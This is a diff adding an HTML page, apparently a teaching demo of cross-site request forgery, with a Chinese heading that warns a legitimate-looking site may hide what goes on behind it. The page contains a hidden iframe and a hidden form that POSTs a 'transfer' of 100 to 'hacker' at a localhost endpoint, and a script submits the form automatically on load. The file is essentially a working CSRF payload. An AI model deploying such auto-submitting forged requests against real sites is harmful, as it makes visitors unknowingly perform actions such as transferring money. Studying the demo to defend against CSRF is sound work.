@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h2>看起来像正规网站，你永远不知道背后发生了什么！</h2>
+    <iframe name="hideIframe" style="display: none"></iframe>
+    <form id="form"  target='hideIframe' method="POST" enctype="application/x-www-form-urlencoded"
+        action="http://localhost:3000/transfer" style="display: none">
+        <input type="text" name="to" value="hacker" />
+        <input type="number" name="money" value="100" />
+    </form>
+    <script>form.submit()</script>
+</body>
+
+</html>
